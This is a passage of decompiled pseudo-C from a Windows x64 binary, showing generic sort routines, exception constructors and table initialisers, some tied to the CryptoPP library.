  v6 = ((unsigned __int64)((unsigned __int128)(((char *)a3 - (char *)a1) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)(((char *)a3 - (char *)a1) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
  if ( v6 <= 40 )
  {
    if ( *v3 < *a1 )
    {
      v30 = *(_QWORD *)a1;
      v31 = *(_QWORD *)v3;
      v32 = v3[2];
      *(_QWORD *)v3 = v30;
      v3[2] = v5[2];
      *(_QWORD *)v5 = v31;
      v5[2] = v32;
    }
    result = *v3;
    if ( *(_DWORD *)a3 < (unsigned int)result )
    {
      v33 = *a3;
      v34 = *((_DWORD *)a3 + 2);
      *a3 = *(_QWORD *)v3;
      *((_DWORD *)a3 + 2) = v3[2];
      *(_QWORD *)v3 = v33;
      v3[2] = v34;
      result = *v5;
      if ( *v3 < (unsigned int)result )
      {
        *(_QWORD *)v3 = *(_QWORD *)v5;
        result = v5[2];
        v3[2] = result;
        *(_QWORD *)v5 = v33;
        v5[2] = v34;
      }
    }
  }
  else
  {
    v7 = (v6 + 1) / 8;
    v8 = 12 * v7;
    v9 = 24 * v7;
    if ( a1[3 * v7] < *a1 )
    {
      v10 = *(_QWORD *)&a1[(unsigned __int64)v8 / 4];
      v11 = a1[(unsigned __int64)v8 / 4 + 2];
      *(_QWORD *)&v5[(unsigned __int64)v8 / 4] = *(_QWORD *)v5;
      v5[(unsigned __int64)v8 / 4 + 2] = v5[2];
      *(_QWORD *)v5 = v10;
      v5[2] = v11;
    }
    if ( v5[(unsigned __int64)v9 / 4] < v5[(unsigned __int64)v8 / 4] )
    {
      v12 = *(_QWORD *)&v5[(unsigned __int64)v9 / 4];
      v13 = v5[(unsigned __int64)v9 / 4 + 2];
      *(_QWORD *)&v5[(unsigned __int64)v9 / 4] = *(_QWORD *)&v5[(unsigned __int64)v8 / 4];
      v5[(unsigned __int64)v9 / 4 + 2] = v5[(unsigned __int64)v8 / 4 + 2];
      *(_QWORD *)&v5[(unsigned __int64)v8 / 4] = v12;
      v5[(unsigned __int64)v8 / 4 + 2] = v13;
      if ( v5[(unsigned __int64)v8 / 4] < *v5 )
      {
        *(_QWORD *)&v5[(unsigned __int64)v8 / 4] = *(_QWORD *)v5;
        v5[(unsigned __int64)v8 / 4 + 2] = v5[2];
        *(_QWORD *)v5 = v12;
        v5[2] = v13;
      }
    }
    v14 = &v3[v8 / 0xFFFFFFFFFFFFFFFCui64];
    if ( *v3 < v3[v8 / 0xFFFFFFFFFFFFFFFCui64] )
    {
      v15 = *(_QWORD *)v3;
      v16 = v3[2];
      *(_QWORD *)v3 = *(_QWORD *)v14;
      v3[2] = v14[2];
      *(_QWORD *)v14 = v15;
      v14[2] = v16;
    }
    if ( v3[(unsigned __int64)v8 / 4] < *v3 )
    {
      v17 = *(_QWORD *)&v3[(unsigned __int64)v8 / 4];
      v18 = v3[(unsigned __int64)v8 / 4 + 2];
      *(_QWORD *)&v3[(unsigned __int64)v8 / 4] = *(_QWORD *)v3;
      v3[(unsigned __int64)v8 / 4 + 2] = v3[2];
      *(_QWORD *)v3 = v17;
      v3[2] = v18;
      if ( *v3 < *v14 )
      {
        *(_QWORD *)v3 = *(_QWORD *)v14;
        v3[2] = v14[2];
        *(_QWORD *)v14 = v17;
        v14[2] = v18;
      }
    }
    v19 = (signed __int64)&a3[v9 / 0xFFFFFFFFFFFFFFF8ui64];
    v20 = (signed __int64)v4 - v8;
    if ( *(_DWORD *)((char *)v4 - v8) < *(_DWORD *)v19 )
    {
      v21 = *(_QWORD *)v20;
      v22 = *(_DWORD *)(v20 + 8);
      *(_QWORD *)v20 = *(_QWORD *)v19;
      *(_DWORD *)(v20 + 8) = *(_DWORD *)(v19 + 8);
      *(_QWORD *)v19 = v21;
      *(_DWORD *)(v19 + 8) = v22;
    }
    if ( *(_DWORD *)v4 < *(_DWORD *)v20 )
    {
      v23 = *v4;
      v24 = *((_DWORD *)v4 + 2);
      *v4 = *(_QWORD *)v20;
      *((_DWORD *)v4 + 2) = *(_DWORD *)(v20 + 8);
      *(_QWORD *)v20 = v23;
      *(_DWORD *)(v20 + 8) = v24;
      if ( *(_DWORD *)v20 < *(_DWORD *)v19 )
      {
        *(_QWORD *)v20 = *(_QWORD *)v19;
        *(_DWORD *)(v20 + 8) = *(_DWORD *)(v19 + 8);
        *(_QWORD *)v19 = v23;
        *(_DWORD *)(v19 + 8) = v24;
      }
    }
    if ( *v3 < v5[(unsigned __int64)v8 / 4] )
    {
      v25 = *(_QWORD *)v3;
      v26 = v3[2];
      *(_QWORD *)v3 = *(_QWORD *)&v5[(unsigned __int64)v8 / 4];
      v3[2] = v5[(unsigned __int64)v8 / 4 + 2];
      *(_QWORD *)&v5[(unsigned __int64)v8 / 4] = v25;
      v5[(unsigned __int64)v8 / 4 + 2] = v26;
    }
    result = *v3;
    if ( *(_DWORD *)v20 < (unsigned int)result )
    {
      v28 = *(_QWORD *)v20;
      v29 = *(_DWORD *)(v20 + 8);
      *(_QWORD *)v20 = *(_QWORD *)v3;
      *(_DWORD *)(v20 + 8) = v3[2];
      *(_QWORD *)v3 = v28;
      v3[2] = v29;
      result = v5[(unsigned __int64)v8 / 4];
      if ( *v3 < (unsigned int)result )
      {
        *(_QWORD *)v3 = *(_QWORD *)&v5[(unsigned __int64)v8 / 4];
        result = v5[(unsigned __int64)v8 / 4 + 2];
        v3[2] = result;
        *(_QWORD *)&v5[(unsigned __int64)v8 / 4] = v28;
        v5[(unsigned __int64)v8 / 4 + 2] = v29;
      }
    }
  }
  return result;
}

//----- (0000000140092790) ----------------------------------------------------
void __fastcall sub_140092790(unsigned int *a1, unsigned int *a2, signed __int64 a3, unsigned __int8 a4)
{
  unsigned int *v4; // rbx
  signed __int64 v5; // rsi
  unsigned int *v6; // rdi
  unsigned __int64 v7; // rdx
  signed __int64 v8; // rdx
  __int64 v9; // rbp
  unsigned int *v10; // [rsp+30h] [rbp-18h]
  __int64 v11; // [rsp+38h] [rbp-10h]
  unsigned __int8 v12; // [rsp+68h] [rbp+20h]

  v12 = a4;
  v4 = a2;
  v5 = a3;
  v6 = a1;
  v7 = (signed __int64)((unsigned __int128)(((char *)a2 - (char *)a1) * (signed __int128)3074457345618258603i64) >> 64) >> 1;
  v8 = (v7 >> 63) + v7;
  if ( v8 <= 32 )
    goto LABEL_7;
  while ( v5 > 0 )
  {
    sub_140092B00(&v10, v6, v4);
    v9 = v11;
    v5 = v5 / 2 / 2 + v5 / 2;
    if ( (signed __int64)(((unsigned __int64)((unsigned __int128)(((char *)v10 - (char *)v6)
                                                                * (signed __int128)3074457345618258603i64) >> 64) >> 63)
                        + ((signed __int64)((unsigned __int128)(((char *)v10 - (char *)v6)
                                                              * (signed __int128)3074457345618258603i64) >> 64) >> 1)) >= (signed __int64)(((unsigned __int64)((unsigned __int128)(((signed __int64)v4 - v11) * (signed __int128)3074457345618258603i64) >> 64) >> 63) + ((signed __int64)((unsigned __int128)(((signed __int64)v4 - v11) * (signed __int128)3074457345618258603i64) >> 64) >> 1)) )
    {
      sub_140092790(v11, v4, v5, v12);
      v4 = v10;
    }
    else
    {
      sub_140092790(v6, v10, v5, v12);
      v6 = (unsigned int *)v9;
    }
    v8 = ((unsigned __int64)((unsigned __int128)(((char *)v4 - (char *)v6) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)(((char *)v4 - (char *)v6) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
    if ( v8 <= 32 )
      goto LABEL_7;
  }
  if ( v8 <= 32 )
  {
LABEL_7:
    if ( v8 > 1 )
      sub_140092240((__int64)v6, (__int64)v4);
  }
  else
  {
    if ( (signed __int64)(((unsigned __int64)((unsigned __int128)(((char *)v4 - (char *)v6)
                                                                * (signed __int128)3074457345618258603i64) >> 64) >> 63)
                        + ((signed __int64)((unsigned __int128)(((char *)v4 - (char *)v6)
                                                              * (signed __int128)3074457345618258603i64) >> 64) >> 1)) > 1 )
      sub_1400922F0((__int64)v6, (__int64)v4);
    sub_140092950((__int64)v6, (__int64)v4);
  }
}

//----- (0000000140092950) ----------------------------------------------------
unsigned __int64 __fastcall sub_140092950(__int64 a1, __int64 a2)
{
  __int64 v2; // r9
  signed __int64 v3; // rcx
  unsigned __int64 result; // rax
  signed __int64 v5; // rbx
  __int64 v6; // xmm1_8
  int v7; // edi
  signed __int64 v8; // r8
  unsigned __int64 v9; // rdx
  signed __int64 v10; // r10
  signed __int64 v11; // rax
  bool i; // zf
  signed __int64 v13; // r8
  signed __int64 v14; // rax
  signed __int64 v15; // rdx
  signed __int64 j; // rdx
  signed __int64 v17; // r10
  signed __int64 v18; // rax
  signed __int64 v19; // rcx
  signed __int64 v20; // rax

  v2 = a1;
  v3 = a2 - a1;
  result = (unsigned __int64)((unsigned __int128)(v3 * (signed __int128)3074457345618258603i64) >> 64) >> 63;
  if ( (signed __int64)(result
                      + ((signed __int64)((unsigned __int128)(v3 * (signed __int128)3074457345618258603i64) >> 64) >> 1)) > 1 )
  {
    v5 = a2 - 12;
    do
    {
      v6 = *(_QWORD *)v5;
      v7 = *(_DWORD *)(v5 + 8);
      v8 = 0i64;
      *(_QWORD *)v5 = *(_QWORD *)v2;
      *(_DWORD *)(v5 + 8) = *(_DWORD *)(v2 + 8);
      v9 = (unsigned __int128)((v3 - 12) * (signed __int128)3074457345618258603i64) >> 64;
      v10 = (v9 >> 63) + ((signed __int64)v9 >> 1);
      v11 = 2i64;
      for ( i = v10 == 2; v11 < v10; i = v11 == v10 )
      {
        if ( *(_DWORD *)(v2 + 12 * v11) < *(_DWORD *)(v2 + 12 * v11 - 12) )
          --v11;
        v13 = v2 + 12 * v8;
        *(_QWORD *)v13 = *(_QWORD *)(v2 + 12 * v11);
        *(_DWORD *)(v13 + 8) = *(_DWORD *)(v2 + 12 * v11 + 8);
        v8 = v11;
        v11 = 2 * v11 + 2;
      }
      if ( i )
      {
        v14 = 3 * v8;
        v8 = v10 - 1;
        v15 = v2 + 4 * v14;
        *(_QWORD *)v15 = *(_QWORD *)(v2 + 12 * v10 - 12);
        *(_DWORD *)(v15 + 8) = *(_DWORD *)(v2 + 12 * v10 - 4);
      }
      for ( j = (v8 - 1) / 2; v8 > 0; j = (j - 1) / 2 )
      {
        v17 = v2 + 12 * j;
        if ( *(_DWORD *)(v2 + 12 * j) >= (unsigned int)v6 )
          break;
        v18 = 3 * v8;
        v8 = j;
        v19 = v2 + 4 * v18;
        *(_QWORD *)v19 = *(_QWORD *)v17;
        *(_DWORD *)(v19 + 8) = *(_DWORD *)(v17 + 8);
      }
      v20 = 3 * v8;
      v5 -= 12i64;
      v3 = v5 - v2 + 12;
      *(_QWORD *)(v2 + 4 * v20) = v6;
      *(_DWORD *)(v2 + 4 * v20 + 8) = v7;
      result = (unsigned __int64)((unsigned __int128)(v3 * (signed __int128)3074457345618258603i64) >> 64) >> 63;
    }
    while ( (signed __int64)(result
                           + ((signed __int64)((unsigned __int128)(v3 * (signed __int128)3074457345618258603i64) >> 64) >> 1)) > 1 );
  }
  return result;
}

//----- (0000000140092B00) ----------------------------------------------------
unsigned int **__fastcall sub_140092B00(unsigned int **a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int *v3; // rsi
  unsigned int **v4; // r14
  unsigned int *v5; // rdi
  signed __int64 v6; // kr00_8
  unsigned int *v7; // rbx
  unsigned int *v8; // r10
  unsigned int v9; // ecx
  unsigned __int64 v10; // rax
  unsigned int v11; // ecx
  unsigned int *v12; // r9
  unsigned int *v13; // r11
  signed __int64 v14; // rdx
  unsigned int *v15; // rax
  __int64 v16; // xmm1_8
  unsigned int v17; // ecx
  bool v18; // zf
  unsigned int *v19; // rdx
  __int64 v20; // xmm1_8
  unsigned int v21; // ecx
  __int64 v22; // xmm1_8
  unsigned int v23; // ecx
  unsigned int *v24; // r8
  unsigned int *v25; // rdx
  unsigned int v26; // ecx
  __int64 v27; // xmm1_8
  __int64 v28; // xmm1_8
  unsigned int v29; // ecx
  __int64 v30; // xmm0_8
  __int64 v31; // xmm1_8
  unsigned int v32; // ecx
  __int64 v33; // xmm1_8
  unsigned int v34; // ecx

  v3 = a2;
  v4 = a1;
  v5 = a3;
  v6 = ((signed __int64)((unsigned __int128)(((char *)a3 - (char *)a2) * (signed __int128)3074457345618258603i64) >> 64) >> 1)
     + ((unsigned __int64)((unsigned __int128)(((char *)a3 - (char *)a2) * (signed __int128)3074457345618258603i64) >> 64) >> 63);
  v7 = &a2[3 * (v6 / 2)];
  sub_140092490(a2, &a2[3 * (v6 / 2)], (__int64 *)(a3 - 3));
  v8 = v7 + 3;
  if ( v3 < v7 )
  {
    do
    {
      v9 = *(v7 - 3);
      v10 = (unsigned __int64)(v7 - 3);
      if ( v9 < *v7 )
        break;
      if ( *v7 < v9 )
        break;
      v7 -= 3;
    }
    while ( (unsigned __int64)v3 < v10 );
  }
  if ( v8 < v5 )
  {
    v11 = *v7;
    do
    {
      if ( *v8 < v11 )
        break;
      if ( v11 < *v8 )
        break;
      v8 += 3;
    }
    while ( v8 < v5 );
  }
  v12 = v8;
  v13 = v7;
  while ( 1 )
  {
    while ( 1 )
    {
      if ( v12 < v5 )
      {
        v14 = (signed __int64)(v8 - 3);
        do
        {
          if ( *v7 >= *v12 )
          {
            if ( *v12 < *v7 )
              break;
            v15 = v8;
            v14 += 12i64;
            v8 += 3;
            if ( v15 != v12 )
            {
              v16 = *(_QWORD *)v14;
              v17 = *(_DWORD *)(v14 + 8);
              *(_QWORD *)v14 = *(_QWORD *)v12;
              *(_DWORD *)(v14 + 8) = v12[2];
              *(_QWORD *)v12 = v16;
              v12[2] = v17;
            }
          }
          v12 += 3;
        }
        while ( v12 < v5 );
      }
      v18 = v13 == v3;
      if ( v13 > v3 )
      {
        v19 = v13 - 3;
        do
        {
          if ( *v19 >= *v7 )
          {
            if ( *v7 < *v19 )
              break;
            v7 -= 3;
            if ( v7 != v19 )
            {
              v20 = *(_QWORD *)v7;
              v21 = v7[2];
              *(_QWORD *)v7 = *(_QWORD *)v19;
              v7[2] = v19[2];
              *(_QWORD *)v19 = v20;
              v19[2] = v21;
            }
          }
          v13 -= 3;
          v19 -= 3;
        }
        while ( v3 < v13 );
        v18 = v13 == v3;
      }
      if ( v18 )
        break;
      v13 -= 3;
      if ( v12 == v5 )
      {
        v7 -= 3;
        if ( v13 != v7 )
        {
          v28 = *(_QWORD *)v13;
          v29 = v13[2];
          *(_QWORD *)v13 = *(_QWORD *)v7;
          v13[2] = v7[2];
          *(_QWORD *)v7 = v28;
          v7[2] = v29;
        }
        v30 = *(_QWORD *)(v8 - 3);
        v31 = *(_QWORD *)v7;
        v32 = v7[2];
        v8 -= 3;
        *(_QWORD *)v7 = v30;
        v7[2] = v8[2];
        *(_QWORD *)v8 = v31;
        v8[2] = v32;
      }
      else
      {
        v33 = *(_QWORD *)v12;
        v34 = v12[2];
        v12 += 3;
        *(_QWORD *)(v12 - 3) = *(_QWORD *)v13;
        *(v12 - 1) = v13[2];
        *(_QWORD *)v13 = v33;
        v13[2] = v34;
      }
    }
    if ( v12 == v5 )
      break;
    if ( v8 != v12 )
    {
      v22 = *(_QWORD *)v7;
      v23 = v7[2];
      *(_QWORD *)v7 = *(_QWORD *)v8;
      v7[2] = v8[2];
      *(_QWORD *)v8 = v22;
      v8[2] = v23;
    }
    v24 = v12;
    v25 = v7;
    v8 += 3;
    v26 = v7[2];
    v7 += 3;
    v12 += 3;
    v27 = *(_QWORD *)v25;
    *(_QWORD *)v25 = *(_QWORD *)v24;
    v25[2] = v24[2];
    *(_QWORD *)v24 = v27;
    v24[2] = v26;
  }
  *v4 = v7;
  v4[1] = v8;
  return v4;
}

//----- (0000000140092D70) ----------------------------------------------------
__int64 __fastcall sub_140092D70(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  if ( a2 )
  {
    result = 0i64;
    do
    {
      if ( a1 )
      {
        *(_QWORD *)a1 = 0i64;
        *(_DWORD *)(a1 + 8) = 0;
      }
      a1 += 12i64;
      --a2;
    }
    while ( a2 );
  }
  return result;
}

//----- (0000000140092DA0) ----------------------------------------------------
__int64 __fastcall sub_140092DA0(_QWORD *a1, __int64 a2)
{
  __int64 result; // rax

  for ( ; a2; --a2 )
  {
    if ( a1 )
    {
      result = 0i64;
      *a1 = 0i64;
      a1[1] = 0i64;
      a1[2] = 0i64;
    }
    a1 += 3;
  }
  return result;
}

//----- (0000000140092DE0) ----------------------------------------------------
__int64 __fastcall sub_140092DE0(__int64 a1, __int64 a2, __int64 a3)
{
  for ( ; a1 != a2; a1 += 12i64 )
  {
    if ( a3 )
    {
      *(_QWORD *)a3 = *(_QWORD *)a1;
      *(_DWORD *)(a3 + 8) = *(_DWORD *)(a1 + 8);
    }
    a3 += 12i64;
  }
  return a3;
}

//----- (0000000140092E20) ----------------------------------------------------
__int64 __fastcall sub_140092E20(__int64 a1, __int64 a2, __int64 a3)
{
  for ( ; a1 != a2; a1 += 24i64 )
  {
    if ( a3 )
    {
      *(_OWORD *)a3 = *(_OWORD *)a1;
      *(_QWORD *)(a3 + 16) = *(_QWORD *)(a1 + 16);
    }
    a3 += 24i64;
  }
  return a3;
}

//----- (0000000140092E60) ----------------------------------------------------
std::exception *__fastcall sub_140092E60(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140092EE0) ----------------------------------------------------
_DWORD *__fastcall sub_140092EE0(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140092FB0) ----------------------------------------------------
__int64 __fastcall sub_140092FB0(__int64 a1, __int64 a2, char a3, int a4)
{
  int v4; // ebx
  char v5; // di
  __int64 v6; // rsi
  __int64 v7; // r14

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  sub_140057900(a1, 0i64);
  *(_DWORD *)(v7 + 48) = v4;
  *(_QWORD *)v7 = &off_1400B6970;
  *(_QWORD *)(v7 + 8) = off_1400B5390;
  sub_1400565B0(v7 + 56, 0i64);
  *(_DWORD *)(v7 + 136) = 0;
  *(_BYTE *)(v7 + 140) = v5;
  *(_WORD *)(v7 + 141) = 0;
  *(_BYTE *)(v7 + 143) = -1;
  *(_WORD *)(v7 + 144) = -1;
  *(_QWORD *)(v7 + 148) = 0i64;
  *(_QWORD *)(v7 + 156) = 0i64;
  *(_QWORD *)(v7 + 164) = 0i64;
  *(_DWORD *)(v7 + 172) = 0;
  *(_QWORD *)(v7 + 176) = 0i64;
  *(_QWORD *)(v7 + 184) = 0i64;
  *(_QWORD *)(v7 + 192) = 0i64;
  *(_QWORD *)(v7 + 200) = 0i64;
  *(_QWORD *)(v7 + 208) = 0i64;
  *(_QWORD *)(v7 + 216) = 0i64;
  *(_QWORD *)(v7 + 224) = 0i64;
  *(_QWORD *)(v7 + 232) = 0i64;
  *(_QWORD *)(v7 + 240) = 0i64;
  *(_QWORD *)(v7 + 248) = 0i64;
  *(_QWORD *)(v7 + 256) = 0i64;
  *(_QWORD *)(v7 + 264) = 0i64;
  *(_QWORD *)(v7 + 272) = 0i64;
  *(_QWORD *)(v7 + 280) = 0i64;
  *(_QWORD *)(v7 + 288) = v7 + 56;
  *(_QWORD *)(v7 + 296) = 0i64;
  *(_QWORD *)(v7 + 312) = 0i64;
  *(_QWORD *)(v7 + 320) = 0i64;
  *(_QWORD *)(v7 + 328) = 0i64;
  *(_QWORD *)(v7 + 336) = 0i64;
  sub_1400589E0(v7, v6);
  return v7;
}
// 1400B5390: using guessed type __int64 (__fastcall *off_1400B5390[3])();
// 1400B6970: using guessed type __int64 (__fastcall *off_1400B6970)(void *);

//----- (0000000140093100) ----------------------------------------------------
_DWORD *__fastcall sub_140093100(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400931E0) ----------------------------------------------------
_DWORD *__fastcall sub_1400931E0(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400932C0) ----------------------------------------------------
__int64 __fastcall sub_1400932C0(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  __int64 result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 1288);
  v2 = *(_QWORD *)(a1 + 1280);
  if ( v1 == (_DWORD *)a1 )
  {
    *(_BYTE *)(a1 + 1273) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (00000001400932F0) ----------------------------------------------------
void __fastcall sub_1400932F0(__int64 a1)
{
  void *v1; // rdx
  unsigned __int64 v2; // r8

  v1 = *(void **)(a1 + 16);
  v2 = *(_QWORD *)(a1 + 8);
  if ( v1 == (void *)a1 )
  {
    *(_BYTE *)(a1 + 5) = 0;
    memset(v1, 0, v2);
  }
  else
  {
    memset(v1, 0, v2);
    free(v1);
  }
}

//----- (0000000140093330) ----------------------------------------------------
void __fastcall sub_140093330(_QWORD **a1)
{
  _QWORD *v1; // rbx

  v1 = *a1;
  if ( *a1 )
  {
    sub_1400913B0(*a1);
    operator delete(v1);
  }
}

//----- (00000001400933B0) ----------------------------------------------------
unsigned int *sub_1400933B0()
{
  char *v0; // rdi
  signed __int64 i; // rcx
  unsigned int *v2; // rdi
  char v4; // [rsp+30h] [rbp-98h]

  v0 = &v4;
  for ( i = 32i64; i; --i )
  {
    *(_DWORD *)v0 = 5;
    v0 += 4;
  }
  v2 = (unsigned int *)operator new(0x40ui64);
  if ( v2 )
  {
    *(_QWORD *)v2 = 0i64;
    *((_QWORD *)v2 + 1) = 0i64;
    *((_QWORD *)v2 + 2) = 0i64;
    *((_QWORD *)v2 + 3) = 0i64;
    *((_QWORD *)v2 + 4) = 0i64;
    *((_QWORD *)v2 + 5) = 0i64;
    *((_QWORD *)v2 + 6) = 0i64;
    *((_QWORD *)v2 + 7) = 0i64;
  }
  else
  {
    v2 = 0i64;
  }
  sub_140094790(v2, (unsigned int *)&v4, 0x20u);
  return v2;
}

//----- (0000000140093450) ----------------------------------------------------
unsigned int *sub_140093450()
{
  char *v0; // rax
  signed __int64 v1; // rcx
  char *v2; // rcx
  signed __int64 v3; // rdx
  char *v4; // rdi
  signed __int64 i; // rcx
  unsigned int *v6; // rdi
  char v8; // [rsp+30h] [rbp-498h]
  char v9; // [rsp+270h] [rbp-258h]
  char v10; // [rsp+430h] [rbp-98h]
  __int64 v11; // [rsp+490h] [rbp-38h]
  __int64 v12; // [rsp+498h] [rbp-30h]
  __int64 v13; // [rsp+4A0h] [rbp-28h]
  __int64 v14; // [rsp+4A8h] [rbp-20h]

  v0 = &v8;
  v1 = 9i64;
  do
  {
    *(_QWORD *)v0 = 34359738376i64;
    *((_QWORD *)v0 + 1) = 34359738376i64;
    *((_QWORD *)v0 + 2) = 34359738376i64;
    v0 += 64;
    *((_QWORD *)v0 - 5) = 34359738376i64;
    *((_QWORD *)v0 - 4) = 34359738376i64;
    *((_QWORD *)v0 - 3) = 34359738376i64;
    *((_QWORD *)v0 - 2) = 34359738376i64;
    *((_QWORD *)v0 - 1) = 34359738376i64;
    --v1;
  }
  while ( v1 );
  v2 = &v9;
  v3 = 7i64;
  do
  {
    *(_QWORD *)v2 = 38654705673i64;
    *((_QWORD *)v2 + 1) = 38654705673i64;
    *((_QWORD *)v2 + 2) = 38654705673i64;
    v2 += 64;
    *((_QWORD *)v2 - 5) = 38654705673i64;
    *((_QWORD *)v2 - 4) = 38654705673i64;
    *((_QWORD *)v2 - 3) = 38654705673i64;
    *((_QWORD *)v2 - 2) = 38654705673i64;
    *((_QWORD *)v2 - 1) = 38654705673i64;
    --v3;
  }
  while ( v3 );
  v4 = &v10;
  for ( i = 24i64; i; --i )
  {
    *(_DWORD *)v4 = 7;
    v4 += 4;
  }
  v11 = 34359738376i64;
  v12 = 34359738376i64;
  v13 = 34359738376i64;
  v14 = 34359738376i64;
  v6 = (unsigned int *)operator new(0x40ui64);
  if ( v6 )
  {
    *(_QWORD *)v6 = 0i64;
    *((_QWORD *)v6 + 1) = 0i64;
    *((_QWORD *)v6 + 2) = 0i64;
    *((_QWORD *)v6 + 3) = 0i64;
    *((_QWORD *)v6 + 4) = 0i64;
    *((_QWORD *)v6 + 5) = 0i64;
    *((_QWORD *)v6 + 6) = 0i64;
    *((_QWORD *)v6 + 7) = 0i64;
  }
  else
  {
    v6 = 0i64;
  }
  sub_140094790(v6, (unsigned int *)&v8, 0x120u);
  return v6;
}

//----- (00000001400935A0) ----------------------------------------------------
signed __int64 __fastcall sub_1400935A0(unsigned __int64 a1)
{
  signed __int64 result; // rax
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  result = 1537228672809129301i64;
  if ( a1 > 0x1555555555555555i64 )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 1;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140093690) ----------------------------------------------------
